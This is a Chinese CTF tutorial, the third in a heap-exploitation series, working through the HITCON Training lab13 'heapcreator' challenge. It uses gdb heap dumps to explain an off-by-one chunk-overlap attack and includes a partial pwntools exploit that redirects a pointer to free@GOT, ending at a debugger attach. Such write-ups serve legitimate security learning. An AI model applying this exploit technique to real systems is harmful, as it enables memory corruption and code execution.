# 1\. pwn堆入门系列教程3
序言：这次终于过了off-by-one来到了Chunk Extend /
Overlapping,这部分在上一节也进行了学习，所以难度相对来说不会是那么大，刚起初我以为，因为第一题很简单，但做到第二题，我发觉我连格式化字符串的漏洞都不会利用，真的是太菜了，后面看了看雪大佬的文章才会做
## 1.1. HITCON Trainging lab13
这道题还是相对简单的，对于前面几道来说，上一道已经用过这种方法了，而且比这复杂许多，所以差不多了，不过还有些小细节注意下就好
### 1.1.1. 功能分析
引用于ctf-wiki
  1. 创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。
  2. 编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 的漏洞。
  3. 展示堆，输出指定索引堆的大小以及内容。
  4. 删除堆，删除指定堆，并且将对应指针设置为了 NULL。
### 1.1.2. 漏洞点分析
漏洞点存在off-by-one,通过off-by-one进行overlapping就成了
### 1.1.3. 漏洞利用过程
    gdb-peda$ x/50gx 0x1775030-0x30
    0x1775000:  0x0000000000000000  0x0000000000000021 #结构体1
    0x1775010:  0x0000000000000018  0x0000000001775030
    0x1775020:  0x0000000000000000  0x0000000000000021 #数据块1 chunk
    0x1775030:  0x0000000a31313131  0x0000000000000000
    0x1775040:  0x0000000000000000  0x0000000000000021 #结构体1
    0x1775050:  0x0000000000000010  0x0000000001775070
    0x1775060:  0x0000000000000000  0x0000000000000021 #数据块2 chunk
    0x1775070:  0x0000000a32323232  0x0000000000000000
    0x1775080:  0x0000000000000000  0x0000000000020f81
    0x1775090:  0x0000000000000000  0x0000000000000000
    0x17750a0:  0x0000000000000000  0x0000000000000000
    0x17750b0:  0x0000000000000000  0x0000000000000000
    0x17750c0:  0x0000000000000000  0x0000000000000000
    0x17750d0:  0x0000000000000000  0x0000000000000000
    0x17750e0:  0x0000000000000000  0x0000000000000000
    0x17750f0:  0x0000000000000000  0x0000000000000000
    0x1775100:  0x0000000000000000  0x0000000000000000
    0x1775110:  0x0000000000000000  0x0000000000000000
    0x1775120:  0x0000000000000000  0x0000000000000000
    0x1775130:  0x0000000000000000  0x0000000000000000
    0x1775140:  0x0000000000000000  0x0000000000000000
    0x1775150:  0x0000000000000000  0x0000000000000000
    0x1775160:  0x0000000000000000  0x0000000000000000
    0x1775170:  0x0000000000000000  0x0000000000000000
    0x1775180:  0x0000000000000000  0x0000000000000000
攻击过程：
  1. 创建两个堆块初始化(实际创了4个堆块，两个结构体堆块，两个数据堆块)至于一个为什么要0x18，因为要利用他会使用下个chunk的pre_size作为数据部分，这样才能off-by-one溢出到size
  2. 编辑第0块堆块，利用off-by-one覆盖第二块堆块的size，修改size为0x41
        gdb-peda$ x/50gx 0x8a5030-0x30
    0x8a5000:   0x0000000000000000  0x0000000000000021
    0x8a5010:   0x0000000000000018  0x00000000008a5030
    0x8a5020:   0x0000000000000000  0x0000000000000021
    0x8a5030:   0x0068732f6e69622f  0x6161616161616161 #/bin/sh为后面做准备
    0x8a5040:   0x6161616161616161  0x0000000000000041 # off-by-one
    0x8a5050:   0x0000000000000010  0x00000000008a5070
    0x8a5060:   0x0000000000000000  0x0000000000000021
    0x8a5070:   0x0000000a32323232  0x0000000000000000
    0x8a5080:   0x0000000000000000  0x0000000000020f81
    0x8a5090:   0x0000000000000000  0x0000000000000000
    0x8a50a0:   0x0000000000000000  0x0000000000000000
    0x8a50b0:   0x0000000000000000  0x0000000000000000
    0x8a50c0:   0x0000000000000000  0x0000000000000000
    0x8a50d0:   0x0000000000000000  0x0000000000000000
    0x8a50e0:   0x0000000000000000  0x0000000000000000
    0x8a50f0:   0x0000000000000000  0x0000000000000000
    0x8a5100:   0x0000000000000000  0x0000000000000000
    0x8a5110:   0x0000000000000000  0x0000000000000000
    0x8a5120:   0x0000000000000000  0x0000000000000000
    0x8a5130:   0x0000000000000000  0x0000000000000000
    0x8a5140:   0x0000000000000000  0x0000000000000000
    0x8a5150:   0x0000000000000000  0x0000000000000000
    0x8a5160:   0x0000000000000000  0x0000000000000000
    0x8a5170:   0x0000000000000000  0x0000000000000000
    0x8a5180:   0x0000000000000000  0x0000000000000000
  3. free掉第1块，这时候free了一个0x40大小的堆块和一个0x20大小的堆块
        gdb-peda$ x/50gx 0xf89030-0x30
    0xf89000:   0x0000000000000000  0x0000000000000021
    0xf89010:   0x0000000000000018  0x0000000000f89030
    0xf89020:   0x0000000000000000  0x0000000000000021
    0xf89030:   0x0068732f6e69622f  0x6161616161616161
    0xf89040:   0x6161616161616161  0x0000000000000041 #free 0x40大小
    0xf89050:   0x0000000000000000  0x0000000000f89070
    0xf89060:   0x0000000000000000  0x0000000000000021 #free 0x21大小
    0xf89070:   0x0000000000000000  0x0000000000000000
    0xf89080:   0x0000000000000000  0x0000000000020f81
    0xf89090:   0x0000000000000000  0x0000000000000000
    0xf890a0:   0x0000000000000000  0x0000000000000000
    0xf890b0:   0x0000000000000000  0x0000000000000000
    0xf890c0:   0x0000000000000000  0x0000000000000000
    0xf890d0:   0x0000000000000000  0x0000000000000000
    0xf890e0:   0x0000000000000000  0x0000000000000000
    0xf890f0:   0x0000000000000000  0x0000000000000000
    0xf89100:   0x0000000000000000  0x0000000000000000
    0xf89110:   0x0000000000000000  0x0000000000000000
    0xf89120:   0x0000000000000000  0x0000000000000000
    0xf89130:   0x0000000000000000  0x0000000000000000
    0xf89140:   0x0000000000000000  0x0000000000000000
    0xf89150:   0x0000000000000000  0x0000000000000000
    0xf89160:   0x0000000000000000  0x0000000000000000
    0xf89170:   0x0000000000000000  0x0000000000000000
    0xf89180:   0x0000000000000000  0x0000000000000000
  4. 这时候create(0x30)的话，会先创建结构体的堆块，这时候fastbin链上有刚free掉的堆块，所以优先使用，创建了0x20大小堆块，然后在创建一个0x40的chunk，这时候可以覆盖掉他的结构体部分的内容指针，泄露地址，在写入就成了
### 1.1.4. exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'heapcreator'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'heapcreator'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = ELF('libc.so.6')
    if local:
        context.log_level = 'debug'
        try:
            r = ctx.start()
        except Exception as e:
            print(e.args)
            print("It can't work,may be it can't load the remote libc!")
            print("It will load the local process")
            io = process(exe)
    else:
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    heap = elf
    libc = ELF('./libc.so.6')
    def create(size, content):
        r.recvuntil(":")
        r.sendline("1")
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(content)
    def edit(idx, content):
        r.recvuntil(":")
        r.sendline("2")
        r.recvuntil(":")
        r.sendline(str(idx))
        r.recvuntil(":")
        r.sendline(content)
    def show(idx):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(idx))
    def delete(idx):
        r.recvuntil(":")
        r.sendline("4")
        r.recvuntil(":")
        r.sendline(str(idx))
    def exp():
        free_got = 0x602018
        create(0x18, "1111")  # 0
        create(0x10, "2222")  # 1
        # overwrite heap 1's struct's size to 0x41
        edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
        # trigger heap 1's struct to fastbin 0x40
        # heap 1's content to fastbin 0x20
        delete(1)
        # new heap 1's struct will point to old heap 1's content, size 0x20
        # new heap 1's content will point to old heap 1's struct, size 0x30
        # that is to say we can overwrite new heap 1's struct
        # here we overwrite its heap content pointer to free@got
        create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1
        #create(0x30, p64(0x1234567890))  #1
        gdb.attach(r)